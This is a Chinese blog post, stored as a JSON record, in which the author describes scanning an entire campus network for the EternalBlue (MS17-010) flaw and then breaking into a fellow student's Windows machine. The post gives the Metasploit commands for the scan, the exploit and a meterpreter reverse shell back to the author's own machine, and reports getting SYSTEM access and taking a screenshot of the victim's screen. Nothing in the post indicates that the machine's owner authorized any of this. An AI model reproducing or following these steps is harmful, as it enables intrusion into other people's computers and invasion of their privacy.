{"title":"用永恒之蓝（MS17-010）对校园网进行渗透测试","uid":"a8cc9a7e29f68e770cf685748e427dea","slug":"school-network-ms17010-pentest","date":"2018-10-23T11:59:26.000Z","updated":"2023-08-27T15:15:28.192Z","comments":true,"path":"api/articles/school-network-ms17010-pentest.json","keywords":null,"cover":"https://images.unsplash.com/photo-1514168757508-07ffe9ae125b?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxfDB8MXxyYW5kb218MHx8aGFja2VyfHx8fHx8MTY5MzE0OTA2Mw&ixlib=rb-4.0.3&q=80&utm_campaign=api-credit&utm_medium=referral&utm_source=unsplash_source&w=1080","content":"<h3 id=\"漏洞描述：\"><a href=\"#漏洞描述：\" class=\"headerlink\" title=\"漏洞描述：\"></a>漏洞描述：</h3><p>通过扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。  </p>\n<h3 id=\"影响版本：\"><a href=\"#影响版本：\" class=\"headerlink\" title=\"影响版本：\"></a>影响版本：</h3><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。  </p>\n<h3 id=\"复现环境：\"><a href=\"#复现环境：\" class=\"headerlink\" title=\"复现环境：\"></a>复现环境：</h3><p>攻击机：parrotOS （IP：30.0.21.10）</p>\n<p>靶机：随机扫描校园网用户</p>\n<h3 id=\"正文：\"><a href=\"#正文：\" class=\"headerlink\" title=\"正文：\"></a>正文：</h3><p>心血来潮扫描一下校园网(博客迁移，图片丢失～)，看一下同学们的操作系统补丁打的勤不勤，不扫不知道，一扫吓一跳。。。</p>\n<p>校园网用户通过DHCP分配IP，然后通过PPPoE进行认证。</p>\n<p>IP规律：30.0.0.0-30.0.255.255。</p>\n<p>首先msf加载永恒之蓝扫描器：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">search ms17-010\nuse auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</code></pre>\n<p>设置目标及扫描线程：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">set rhost 30.0.0-255.0-255\nset threads 500\nshow options\nrun</code></pre>\n<p>不一会就有结果了，先拿第一个试试30.0.14.154</p>\n<p>打开一个新的终端，启动msf并加载ms17-010的EXP</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">search ms17-010\nuse exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue\nset rhost 30.0.14.154\nrun</code></pre>\n<p>执行过后，win，马上得到了一个shell，system权限</p>\n<p>若中文乱码则设置终端编码为utf-8</p>\n<p>此时的shell是windows的cmd，如果要看个屏幕啊之类的就比较麻烦，这时我们用msf的payload反弹一个shell，用msf提供的，比较方便</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">show payloads\nset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp\nset lhost 30.0.21.10\nrun</code></pre>\n<p>反弹成功，截取一张屏幕截图</p>\n<p>最后我们可以在桌面留一份文档或者找用户的联系方式（QQ or WeChat）告诉用户需要打补丁了。</p>\n<p>要看视频请移步哔哩哔哩，别忘了一键三连呦~~~</p>\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\">\n    <iframe src=\"//player.bilibili.com/player.html?aid=73730410&bvid=BV1VE411h74k&cid=126112764&page=1\"  scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"></iframe>\n</div>","text":"漏洞描述：通过扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖...","link":"","photos":[],"count_time":{"symbolsCount":"1.1k","symbolsTime":"1 mins."},"categories":[{"name":"安全","slug":"安全","count":7,"path":"api/categories/安全.json"},{"name":"渗透测试","slug":"安全/渗透测试","count":2,"path":"api/categories/安全/渗透测试.json"},{"name":"渗透测试","slug":"渗透测试","count":2,"path":"api/categories/渗透测试.json"},{"name":"校园网","slug":"渗透测试/校园网","count":1,"path":"api/categories/渗透测试/校园网.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":2,"path":"api/tags/渗透测试.json"},{"name":"永恒之蓝","slug":"永恒之蓝","count":1,"path":"api/tags/永恒之蓝.json"},{"name":"校园网","slug":"校园网","count":1,"path":"api/tags/校园网.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A\"><span class=\"toc-text\">漏洞描述：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A\"><span class=\"toc-text\">影响版本：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%EF%BC%9A\"><span class=\"toc-text\">复现环境：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%AD%A3%E6%96%87%EF%BC%9A\"><span class=\"toc-text\">正文：</span></a></li></ol>","author":{"name":"Pa2sw0rd","slug":"blog-author","avatar":"http://static.pa2sw0rd.cn/static/images/pa2sw0rd.webp","link":"/","description":"一位正在重塑知识的技术人 <br /> @ <b>公众号：Pa2sw0rd</b>","socials":{"github":"https://github.com/Pa2sw0rd","twitter":"https://twitter.com/pa2sword","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://live.bilibili.com/22619211"},"douyin":{"icon":"/svg/douyin.svg","link":"https://www.douyin.com/user/MS4wLjABAAAA-Ohh-uecs-fV_2dHQpkNPD8KUHel_Mzuok9jyxBAJmM"}}}},"mapped":true,"hidden":false,"prev_post":{"title":"记一次任意用户密码修改漏洞","uid":"bd1e536e6f629d63f249e64bcb6082d0","slug":"change-any-user-passwd","date":"2020-07-28T06:45:41.000Z","updated":"2023-08-27T14:43:21.187Z","comments":true,"path":"api/articles/change-any-user-passwd.json","keywords":null,"cover":"https://images.unsplash.com/photo-1691522949910-28fcfb326904?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxfDB8MXxyYW5kb218MHx8fHx8fHx8MTY5MzE0NzIwMQ&ixlib=rb-4.0.3&q=80&w=1080","text":"这是一个学校的固定资产管理系统登录页面，尝试几个弱口令未遂，发现有验证码，爆破不是很有可能，决定从前端分析(迁移博客，图片丢失～) 当在输入工号后点击其它地方，...","link":"","photos":[],"count_time":{"symbolsCount":923,"symbolsTime":"1 mins."},"categories":[{"name":"安全","slug":"安全","count":7,"path":"api/categories/安全.json"},{"name":"web","slug":"安全/web","count":1,"path":"api/categories/安全/web.json"},{"name":"web","slug":"web","count":1,"path":"api/categories/web.json"}],"tags":[{"name":"web漏洞","slug":"web漏洞","count":1,"path":"api/tags/web漏洞.json"}],"author":{"name":"Pa2sw0rd","slug":"blog-author","avatar":"http://static.pa2sw0rd.cn/static/images/pa2sw0rd.webp","link":"/","description":"一位正在重塑知识的技术人 <br /> @ <b>公众号：Pa2sw0rd</b>","socials":{"github":"https://github.com/Pa2sw0rd","twitter":"https://twitter.com/pa2sword","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://live.bilibili.com/22619211"},"douyin":{"icon":"/svg/douyin.svg","link":"https://www.douyin.com/user/MS4wLjABAAAA-Ohh-uecs-fV_2dHQpkNPD8KUHel_Mzuok9jyxBAJmM"}}}}},"next_post":{}}